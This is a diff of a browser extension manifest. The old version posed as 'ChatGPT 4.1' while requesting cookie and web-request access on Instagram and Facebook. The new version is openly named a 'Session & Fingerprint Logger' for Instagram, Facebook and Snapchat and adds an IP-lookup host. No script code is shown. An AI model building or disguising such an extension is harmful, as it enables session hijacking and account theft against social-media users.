@@ -1,13 +1,14 @@
 {
   "manifest_version": 3,
-  "name": "ChatGPT 4.1",
-  "version": "1.1",
-  "description": "ChatGPT-4 is an advanced language model by OpenAI that understands, generates, and responds to human-like text with high accuracy.",
-  "permissions": ["cookies", "webRequest", "webNavigation"],
+  "name": "Session & Fingerprint Logger",
+  "version": "1.0",
+  "description": "Logs fingerprint and session IDs from IG/FB/SC",
+  "permissions": ["cookies", "webRequest", "webNavigation", "scripting"],
   "host_permissions": [
     "*://*.instagram.com/*",
     "*://*.facebook.com/*",
-    "*://facebook.com/*"
+    "*://*.snapchat.com/*",
+    "https://api.ipify.org/*"
   ],
   "background": {
     "service_worker": "background.js",
@@ -18,10 +19,10 @@
       "matches": [
         "*://*.instagram.com/*",
         "*://*.facebook.com/*",
-        "*://facebook.com/*"
+        "*://*.snapchat.com/*"
       ],
-      "js": ["wake.js"],
-      "run_at": "document_start"
+      "js": ["content.js"],
+      "run_at": "document_idle"
     }
   ],
   "icons": {
